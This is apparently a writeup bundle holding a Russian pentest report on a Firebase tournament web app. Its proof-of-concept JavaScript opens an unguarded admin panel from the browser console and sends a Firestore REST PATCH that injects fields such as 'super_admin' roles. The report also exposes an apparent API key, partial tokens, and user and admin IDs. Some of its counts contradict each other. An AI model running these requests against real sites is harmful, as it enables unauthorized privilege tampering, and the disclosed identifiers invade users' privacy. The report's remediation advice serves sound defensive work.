<!--
LICENSE UPL
Author: Mauro Risonho de Paula Assumpção
Data Create: 2026-03-16
Data Update: 2026-03-16
-->

---
name: writeup-asdlikes
description: CTF writeups and security challenges by ASDlikeS.
---

# Writeups by ASDlikeS

Source repository: `/repos/ASDlikeS`

## Repository Index

- pentest_reports/README.md
- pentest_reports/DCP-Tournament/report.md

## Writeup Content


### File: pentest_reports/README.md

# 🔐 Pentest Reports

A collection of personal web application security assessments — findings, vulnerabilities, and remediation recommendations documented in structured reports.

## 📋 What's inside

Each report covers a full black/white/grey box security assessment including attack vectors, proof-of-concept exploits, CVSS scoring, and actionable fixes.

## 📁 Reports

| Target                                      | Date        | Risk Level  | Key Findings                                       |
| ------------------------------------------- | ----------- | ----------- | -------------------------------------------------- |
| [dcp-tournament.web.app](./DCP-Tournament/) | Mar 6, 2026 | 🔴 Critical | REST API field injection, exposed Firebase objects |

## 🛠️ Methodology

- **Recon** — tech stack fingerprinting, JS analysis, endpoint discovery
- **Exploitation** — PoC development, privilege escalation attempts
- **Reporting** — CVSS scoring, risk prioritization, remediation guidance

## ⚠️ Disclaimer

All testing was performed **legally and ethically** on authorized targets only. Reports are published for educational purposes. Do not use any of the techniques described here without explicit written permission from the target owner.

---

_by [ASDLikeS](https://github.com/ASDlikeS)_



### File: pentest_reports/DCP-Tournament/report.md

# 🔐 Отчёт о Пентесте

|                 |                                                                |
| --------------- | -------------------------------------------------------------- |
| **Сайт**        | [dcp-tournament.web.app](https://dcp-tournament.web.app)       |
| **Дата**        | 6 марта 2026                                                   |
| **Исполнитель** | ASDLikeS                                                       |
| **GitHub**      | [github.com/ASDlikeS](https://github.com/ASDlikeS)             |
| **Репозиторий** | [pentest_reports](https://github.com/ASDlikeS/pentest_reports) |

---

## 1. Общая информация

### 1.1 Цель тестирования

Выявление уязвимостей веб-приложения, оценка безопасности клиентской части, проверка правил Firebase Firestore и возможности несанкционированного получения привилегий.

### 1.2 Методология

- **Тип тестирования:** White Box (частичный доступ к исходному коду)
- **Инструменты:** Chrome DevTools, Firebase SDK, REST API
- **Методы:** Анализ кода, перехват объектов, модификация на лету, тестирование API

### 1.3 Стек технологий

| Компонент            | Технология                                    |
| -------------------- | --------------------------------------------- |
| **Frontend**         | Чистый JavaScript, HTML, CSS                  |
| **Backend**          | Firebase (Authentication, Firestore, Hosting) |
| **Ключевые объекты** | `profileManager`, `AdminNotificationPanel`    |

---

## 2. Краткое резюме

| Уровень риска                  | Кол-во | Описание                                                        |
| ------------------------------ | :----: | --------------------------------------------------------------- |
| 🔴 **Критический** (CVSS 9.0+) |   1    | REST API позволяет добавлять произвольные поля в документы      |
| 🟠 **Высокий** (CVSS 7.0–8.9)  |   1    | Глобальный объект `profileManager` с полным доступом к Firebase |
| 🟡 **Средний** (CVSS 4.0–6.9)  |   2    | Доступ к админ-интерфейсу, слабая валидация полей               |
| 🟢 **Низкий** (CVSS 0–3.9)     |   1    | Отсутствие rate limiting                                        |

---

## 3. Детальный анализ уязвимостей

---

### 🟡 3.1 Уязвимость №1 — Небезопасная клиентская логика

**Класс:** `AdminNotificationPanel`  
**Уровень риска:** Средний · **CVSS 5.0**

#### Описание

Класс `AdminNotificationPanel` находится в глобальной области видимости и может быть инициализирован из консоли браузера **без проверки прав**.

#### Вектор атаки

```javascript
// Любой пользователь может выполнить:
const panel = new AdminNotificationPanel(currentUser.uid, true);
panel.init();
```

#### Доступные методы после инициализации

```
constructor, init, loadAdminName, setupTabs, startListening, addNotification,
removeNotification, handleNotificationClick, updateCount, setupTools, searchPlayers,
selectPlayer, showBanForm, executeBan, showWarnForm, executeWarn, executeUnban,
executeRemoveWarn, showResult, escHtml, formatTime, formatTimeRemaining, destroy
```

#### Почему это опасно

Хотя бэкенд заблокировал выполнение критических действий (бан, разбан), сам факт наличия административного интерфейса у обычного пользователя создаёт **информационную уязвимость** и повышает риск социальной инженерии.

#### Доказательство (PoC)

```javascript
> new AdminNotificationPanel("any-uid", true).init()
← Admin panel initialized
```

---

### 🟠 3.2 Уязвимость №2 — Глобальный объект `profileManager`

**Класс:** `ProfileManager`  
**Уровень риска:** Высокий · **CVSS 7.5**

#### Описание

Объект `profileManager` экспортирован в глобальную область видимости `window` и содержит **полную конфигурацию Firebase**, включая API-ключи, токены доступа и прямые ссылки на базу данных.

#### Скомпрометированные данные

```javascript
{
  "profile": { /* полные данные пользователя, email, uid */ },
  "currentUser": {
    "uid": "oiIeb9xP2PaA4Kn2yCoyZIQumMJ2",
    "email": "user@email.com",
    "stsTokenManager": {
      "refreshToken": "AMf-vBw7IN1o...",       // Токен обновления
      "accessToken": "eyJhbGciOiJSUzI1...",    // JWT токен
      "expirationTime": 1772750001235
    },
    "apiKey": "AIzaSyCH7K520x1sLq8-nUJsedKU2unEJ_EcWkY"
  },
  "advancedStatsPanel": {
    "db":   { /* Прямой доступ к Firestore */ },
    "auth": { /* Прямой доступ к Authentication */ }
  }
}
```

#### Доступные методы (42 метода)

```
startOnlineTracking, stopOnlineTracking, initLoadingManager, showLoading, hideLoading,
initParticles, getResendCooldown, saveResendCooldown, startResendCooldown,
autoSendVerificationEmail, startVerificationMonitoring, showEmailVerificationWarning,
loadProfile, saveProfile, init, renderProfile, loadLeaderboard,
startLeaderboardAutoScroll, renderTournamentStats, renderHistory, generateScore,
checkAndUnlockAchievements, renderAchievements, animateStats, animateCounter,
getInitials, formatDate, setupEventListeners, logout, addTournamentResult, addXP,
animateXPBar, checkAchievements, showAchievementUnlocked, enableLeaderboardEditing,
logPanelInfo
```

#### Почему это опасно

Злоумышленник получает:

- Полный доступ к Firestore (чтение всех данных)
- Возможность выполнять запросы **от имени пользователя**
- API-ключи для внешних атак
- JWT-токены для подделки сессий

#### Доказательство (PoC)

```javascript
> console.log(profileManager.advancedStatsPanel.db)
← Firebase Firestore object with full access
```

---

### 🔴 3.3 Уязвимость №3 — REST API Arbitrary Field Injection

**Уровень риска:** Критический · **CVSS 8.5**

#### Описание

REST API Firestore позволяет аутентифицированным пользователям **добавлять произвольные новые поля** в свои документы, хотя изменение существующих защищённых полей (`role`, `isAdmin`) заблокировано.

#### Вектор атаки

```javascript
// PATCH запрос к REST API
fetch(
  `https://firestore.googleapis.com/v1/projects/dcp-tournament/databases/(default)/documents/players/${uid}`,
  {
    method: "PATCH",
    headers: {
      Authorization: `Bearer ${accessToken}`,
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      fields: {
        customRole: { stringValue: "super_admin" },
        permissions: {
          arrayValue: {
            values: [
              { stringValue: "ban_users" },
              { stringValue: "delete_content" },
            ],
          },
        },
      },
    }),
  },
);
```

#### Успешно добавленные поля

```
test_counter · test_string · test_boolean · test_timestamp
permissions · access_level · user_type · customRole
```

#### Почему это опасно

- Можно создать **альтернативную систему прав**
- Если клиентский код начнёт проверять новые поля — возникнет брешь
- Возможно внедрение полей, переопределяющих логику проверки
- **Массовая модификация** документов пользователей
- Потенциальное создание документов в других коллекциях

#### Доказательство (PoC)

```javascript
> fetch(...).then(r => r.json())
← { name: "...", updateTime: "2026-03-05T22:52:48.469732Z", fields: {...} }
// updateTime изменился — запись прошла успешно
```

---

### 🟡 3.4 Уязвимость №4 — Слабая защита коллекций

**Уровень риска:** Средний · **CVSS 5.5**

#### Обнаруженные коллекции

| Коллекция | Документов | Содержимое                                            |
| --------- | :--------: | ----------------------------------------------------- |
| `players` |     18     | Пользователи, email, аватарки (base64), история банов |
| `system`  |     1      | Системные настройки, версия                           |
| `news`    |     1      | Новости, автор (ID админа), статус                    |

#### Пример данных `system`

```javascript
{
  "version":   1770515100633,
  "timestamp": { "seconds": 1770515100, "nanoseconds": 500000000 }
}
```

#### Пример данных `news`

```javascript
{
  "featured":    false,
  "status":      "approved",
  "description": "...",
  "authorId":    "vaZTYsayVwSkGhsMiu693I5bjOm1",  // ID администратора
  "image":       "data:image/jpeg;base64,..."       // Base64 изображения
}
```

#### Почему это опасно

- Email пользователей хранятся **в открытом виде**
- Аватарки в base64 **увеличивают размер БД**
- ID администраторов **в открытом доступе**

---

### 🟢 3.5 Уязвимость №5 — Отсутствие Rate Limiting

**Уровень риска:** Низкий · **CVSS 3.0**

#### Описание

При массовых запросах к REST API сервер возвращает ошибку `429 Too Many Requests`, что является защитным механизмом. Однако он срабатывает **не мгновенно**, позволяя выполнить несколько успешных запросов до блокировки.

#### Доказательство (PoC)

```javascript
> fetch(...) // несколько запросов подряд
← Статус 429 после серии успешных запросов
```

---

## 4. Статистика базы данных

### 4.1 Общая статистика

| Параметр                 | Значение |
| ------------------------ | -------- |
| Всего пользователей      | 18       |
| Администраторов          | 2        |
| Email в открытом доступе | 0        |
| Аватарок (base64)        | 10       |

### 4.2 Администраторы

| Username     | UID                            | Статистика          |
| ------------ | ------------------------------ | ------------------- |
| `Faraday`    | `Iopg5bK6YqNKfxe8xiYSTi2byfC2` | 0 банов             |
| `brbrbrbrbr` | `vaZTYsayVwSkGhsMiu693I5bjOm1` | 5 банов, 5 разбанов |

### 4.3 История банов

| Пользователь  | Действие                      | Дата       |
| ------------- | ----------------------------- | ---------- |
| `dolbaeb2281` | Забанен/разбанен `brbrbrbrbr` | 2026-03-04 |
| `defrtyyhgv`  | Забанен/разбанен `brbrbrbrbr` | 2026-03-04 |
| `anemone`     | Забанен/разбанен `brbrbrbrbr` | 2026-03-05 |
| `NightBREEZE` | Забанен/разбанен `brbrbrbrbr` | 2026-03-05 |
| `egor'kashow` | Забанен/разбанен `brbrbrbrbr` | 2026-03-05 |

---

## 5. Рекомендации по исправлению

### 🔴 5.1 Критические — исправить немедленно

**REST API Field Injection**

```javascript
// В правилах Firestore запретить добавление новых полей:
allow update: if request.resource.data.diff(resource.data).affectedKeys()
    .hasOnly(['field1', 'field2', ...]);

// Или использовать валидацию по белому списку:
allow update: if request.resource.data.keys().hasOnly([
    'username', 'experience', 'level', 'tournamentStats'
]);
```

**Удалить глобальные объекты**

```javascript
// ❌ Было:
window.profileManager = new ProfileManager();

// ✅ Стало (использовать замыкание):
(function () {
  const profileManager = new ProfileManager();
  // Вся логика внутри
})();
```

---

### 🟠 5.2 Высокого приоритета

**Обфускация клиентского кода**

Использовать минификаторы и обфускаторы (Terser, Webpack) для защиты бизнес-логики.

**Инкапсуляция классов**

```javascript
// Скрыть AdminNotificationPanel от глобальной области:
const AdminNotificationPanel = (function () {
  class AdminPanel {
    /* ... */
  }
  return AdminPanel;
})();
```

---

### 🟡 5.3 Среднего приоритета

**Валидация полей при записи**

```javascript
const allowedFields = ["username", "avatarURL", "experience"];
Object.keys(newData).forEach((key) => {
  if (!allowedFields.includes(key)) {
    throw new Error(`Invalid field: ${key}`);
  }
});
```

**Очистка тестовых аккаунтов**

Удалить тестовых пользователей (`Bezdar`, `defrgthy` и др.) из базы данных.

---

### 🟢 5.4 Низкого приоритета

- **Rate Limiting** — улучшить защиту от массовых запросов
- **Аудит действий** — логировать все критические операции (баны, изменения прав)
- **Firebase Storage** — хранить аватарки и изображения новостей в Storage вместо base64 в Firestore

---

## 6. Заключение

Приложение имеет **хорошую базовую защиту** данных в Firestore (запись защищённых полей заблокирована), но страдает от типичных проблем клиентской безопасности:

| Проблема                                                  | Статус           |
| --------------------------------------------------------- | ---------------- |
| Глобальные объекты — главный источник уязвимостей         | ⚠️ Не исправлено |
| Открытый REST API — позволяет инжектить произвольные поля | ⚠️ Не исправлено |
| Недостаточная валидация — создаёт риски на будущее        | ⚠️ Не исправлено |

### Общий уровень безопасности: ⬇️ Ниже среднего

### Рекомендуемые действия

1. 🔴 Немедленно исправить REST API валидацию
2. 🟠 Инкапсулировать все глобальные объекты
3. 🟠 Обфусцировать клиентский код
4. ✅ Провести повторный аудит после исправлений

---

> Отчёт составлен **6 марта 2026 года**  
> Тестирование проведено **ASDLikeS** в рамках White Box Security Assessment  
> GitHub: [github.com/ASDlikeS](https://github.com/ASDlikeS)

